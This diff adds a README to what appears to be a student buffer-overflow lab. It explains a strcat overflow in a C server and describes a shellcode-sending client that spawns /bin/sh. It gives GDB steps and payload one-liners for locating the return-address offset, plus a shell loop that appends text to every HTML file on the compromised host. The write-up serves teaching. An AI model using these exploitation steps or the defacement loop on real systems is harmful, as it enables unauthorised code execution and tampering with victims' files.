@@ -1,0 +1,118 @@
+
+
+There is two parts: 
+    1- Code Explanation
+    2- GDB Tests.
+
+    
+#############################################################################################################################
+#############################################################################################################################
+
+## GDB Tests on Buffer Overflow Vulnerability
+
+## Buffer Overflow Attack Demonstration
+
+The code is a demonstration of a buffer overflow attack. It's inspired by this video (`"https://www.youtube.com/watch?v=btkuAEbcQ80"`) which summarizes the concept of a buffer overflow attack. We execute a shell code to open a terminal shell /
+bin/sh. The shell code reference can be found here (`https://www.exploit-db.com/exploits/43550`).
+
+## Code Explanation
+
+The program starts by building a message to be sent over the network. It then creates a socket connection to a specified IP 
+address (`"192.168.56.103"`) and port (`4321`). It waits for an incoming message and responds by sending the built message.
+The program continues to listen (`echo server`) for commands from the terminal and sends them over the socket connection.
+
+The `buildShellMessage` is carefully constructed for the buffer overflow attack. It starts with a _shell code_ followed by _filler bytes_ and then the _return address_ that points to the beginning of the _shell code_. This shell code is executed when the buffer overflow occurs, opening a `terminal shell`. This terminal shell can serve as a gateway to manipulate files on the target system.
+
+
+## Vulnerability Explanation
+
+
+The vulnerability arises in the `parse()` function, specifically in the following lines:
+
+                 ========================================
+                ||fgets(buf, sizeof(buf), stdin);       ||
+                ||strcpy(greeting_text, "Hello, dear ");||
+                ||strcat(greeting_text, buf);           ||
+                 ========================================
+
+Here, `fgets()` reads user input into the buffer buf which is **256 bytes** in size. Then `strcpy()` and `strcat()` functions are used to construct a greeting message in the `greeting_text` buffer which is only **128 bytes**. If the user input exceeds **128 bytes,** the `strcat()`call causes a buffer overflow in the `greeting_text` buffer, overwriting adjacent memory locations.
+
+This vulnerability can be exploited by sending a user name that is longer than **128 bytes**, causing the program to 
+overwrite the stack and potentially execute arbitrary code.
+
+In this case, the arbitrary code is a shell code that executes `/bin/sh`, opening a _terminal shell_. This shell can be used 
+to manipulate files on the system, for instance, appending a string to the end of all HTML files.
+
+## Instructions to Execute the Code
+
+** Execute the newOverflowAttack script using the following command: `./attacking`
+
+** Run the following command: `cd ; for i in $(find . -name *.html); do echo '<p>YOUR NAME</p>' >>  $i; done`
+
+
+##########################################################################################################################
+##########################################################################################################################
+
+## GDB Tests on Buffer Overflow Vulnerability
+
+This document will guide you through the steps of testing the buffer overflow vulnerability using the GNU Debugger (GDB). We will use a simplified C program, test_gdb.c, to demonstrate this process.
+
+   #### Proof of Overwrite
+
+We can use GDB to analyze the behavior of stack memory when the program is fed with a long string input. Follow these steps:
+
+** Compile the test_gdb.c program using the following command: `gcc -m32 -fno-stack-protector -z execstack test_gdb.c -o test_gdb`
+
+** Run GDB with the following command: `gdb test_gdb`
+
+**Feed the program with a _200-character_ string using the `r < attack.txt` command. The `attack.txt` file contains a 
+_200-character_ string of 'A's, which you can generate with the following Python command: 
+`python3 -c 'print("A"*200)' > attack.txt`.
+
+** After executing these steps, GDB will report a segmentation fault. The return pointer `(0x41414141)` is not recognized because it's overwritten with '`A`'s, which is represented by 41 in hexadecimal.
+
+   #### Exploiting the Vulnerability
+
+To exploit this vulnerability, we need to determine the exact number of 'A's required to overwrite the return pointer. This count is the distance between the _return pointer_ and the _greeting_text_ + 12 (for the string "Hello, dear ").
+
+Here's how we can calculate this:
+
+   ** Set a breakpoint at the beginning of the parse function using the `b *0x########` command. For example, if the parse function starts at 0x565561dd (my case), you would use `b *0x565561dd`.
+
+   ** Run the program until it stops at the breakpoint. At this point, the stack pointer is the return pointer. You can get the return pointer's position with the `x/xw $sp` command. 
+
+                                         ============================
+                                        ||gdb-peda$ x/xw $sp        ||
+                                        ||0xffffcedc:	  0x565562ef||
+                                         ============================
+
+   ** We search for the address of the greeting_text message using the command: `p &greeting_text`
+
+                                       ===============================
+                                      ||gdb-peda$ p &greeting_text   ||
+                                      ||$1 (char (*)[128]) 0xffffce50||
+                                       ===============================
+
+   ** Calculate the distance between the return pointer and the `greeting_text` using the following command:
+    
+                                       =======================================
+                                      ||gdb-peda$ p/d 0xffffcedc - 0xffffce50||
+                                      ||$2 = 140                             ||
+                                       =======================================
+   
+   ** To verify this, generate a new attack.txt file with the following command: `python3 -c 'print("A"*128 + "WXYZ") ' > attack.txt`. Then, go back to GDB, run the program with `r < attack.txt`, and observe the output. The return pointer should now be successfully modified to `0x5a595857` , which corresponds to the hexadecimal code of "WXYZ", resulting in a segmentation fault.
+
+   ### Structure of the stack memory:
+   
+|| === BUF === || === GREETING_TEXT === || === IDK === || == RETURN ADDRESS == ||
+||     256     ||          128          ||     12      ||          bingo       ||
+
+
+
+#### Note:
+  ** 128 = 140 - 12 and 12 is the length of "Hello, dear ". ( 128 used in print("A"*128 + "WXYZ"))
+  ** In the stack memory there 12 bytes between greeting_text and the return address, i don't know what is really but i find that it is reserved for a "frame pointer".
+  ** In the screenshots folder, you can find screenshots of my terminal from the starts (there is 4 screenshots ordered alphabetically)
+  ** There is also another screenshot of the modified web page. it starts with "YOUR NAME", i just forgot to change the command that i used in the mu challenge.
+
+Thank you for reading!!
